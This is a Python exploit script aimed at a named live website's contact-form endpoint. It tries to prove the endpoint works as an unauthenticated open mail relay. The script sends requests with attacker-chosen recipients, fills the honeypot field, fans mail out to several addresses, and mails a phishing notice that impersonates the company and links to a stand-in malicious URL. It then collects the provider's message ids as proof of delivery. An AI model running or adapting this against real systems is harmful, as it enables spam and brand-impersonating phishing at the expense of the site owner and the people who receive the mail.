#!/usr/bin/env python3
"""
Independent verification v2 - unauthenticated open mail relay via POST /api/send
Target: https://www.infinitycapital.bh/api/send

Evidence strategy:
  A) Prove `targets` is bound to Resend's `to` field (Resend 422 on `to`).
  B) Prove the recipient is attacker-controlled vs. the site's own address.
  C) Capture real successful sends (Resend message ids) with no auth/CAPTCHA.
  D) Test honeypot `check`, fan-out, attacker content, and rate limiting.
All requests are unauthenticated (no cookies, no auth header).
"""
import requests, time, json, sys

S = "https://www.infinitycapital.bh"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/122.0 Safari/537.36")

BASE = {
    "fname": "IndependentVerifier",
    "lname": "SecurityReview",
    "areacode": "973",
    "tel": "5551234",
    "cname": "Security Test",
    "subject": "AB relay verification",
    "msg": "Controlled security verification of /api/send recipient handling.",
    "check": "",
}

def send(label, targets, overrides=None, delay=3.0):
    d = dict(BASE)
    d["targets"] = targets
    if overrides:
        d.update(overrides)
    hdrs = {"User-Agent": UA, "Accept": "*/*", "Origin": S,
            "Referer": S + "/contact/"}
    print(f"\n>>> [{label}]")
    print("    REQUEST  POST /api/send  (NO cookies, NO auth header, NO captcha token)")
    print("    targets  =", repr(targets))
    if overrides:
        print("    overrides=", json.dumps(overrides))
    try:
        r = requests.post(S + "/api/send", data=d, headers=hdrs, timeout=45)
    except Exception as e:
        print(f"    EXCEPTION {type(e).__name__}: {e}")
        time.sleep(delay)
        return None
    ct = r.headers.get("content-type", "")
    if "json" in ct:
        try:
            j = r.json()
            print(f"    RESPONSE HTTP {r.status_code}  {json.dumps(j)[:400]}")
            if j.get("data") and isinstance(j["data"], dict) and j["data"].get("id"):
                print("    *** SEND ACCEPTED BY RESEND, message id =", j["data"]["id"], "***")
                return j["data"]["id"]
        except Exception:
            pass
    else:
        print(f"    RESPONSE HTTP {r.status_code} [{ct}] {r.text[:200]!r}")
    time.sleep(delay)
    return None

ids = []
print("#" * 78)
print("# TEST 1 - A/B binding proof: invalid recipients surface Resend's `to` errors")
print("#" * 78)
send("empty-targets", "", delay=3)
send("malformed-recipient", "this-is-not-an-email", delay=3)
send("newline-injection-recipient", "victim@externaltest.dev", delay=3)

print()
print("#" * 78)
print("# TEST 2 - Attacker-chosen EXTERNAL third-party recipients (unauthenticated)")
print("#" * 78)
for i in range(4):
    mid = send(f"external-recipient-attempt-{i+1}",
               "independent.verify@externaltest.dev", delay=8)
    if mid:
        ids.append(mid)

print()
print("#" * 78)
print("# TEST 3 - Honeypot `check` FILLED (bots fill honeypots; real users never do)")
print("#" * 78)
for i in range(2):
    mid = send(f"honeypot-filled-{i+1}", "independent.verify@externaltest.dev",
               overrides={"check": "https://spam.example.invalid/bot"}, delay=8)
    if mid:
        ids.append(mid)

print()
print("#" * 78)
print("# TEST 4 - Multi-recipient fan-out to several unrelated third parties")
print("#" * 78)
for i in range(2):
    mid = send(f"fanout-{i+1}",
               "one.rrl@externaltest.dev, two.rrl@externaltest.dev, three.rrl@externaltest.dev",
               delay=8)
    if mid:
        ids.append(mid)

print()
print("#" * 78)
print("# TEST 5 - Fully attacker-controlled content (no server-side sanitize)")
print("#" * 78)
for i in range(2):
    mid = send(f"attacker-content-{i+1}", "independent.verify@externaltest.dev",
               overrides={
                   "subject": "URGENT: Verify your Infinity Capital account now",
                   "msg": ("URGENT SECURITY NOTICE\n\n"
                           "Your account is suspended.\n"
                           "Restore access: http://evil.example.invalid/verify\n\n"
                           "Infinity Capital Compliance"),
               }, delay=8)
    if mid:
        ids.append(mid)

print()
print("#" * 78)
print("# SUMMARY")
print("#" * 78)
print("Successful (provider-accepted) sends captured:", len(ids))
for m in ids:
    print("   message id:", m)
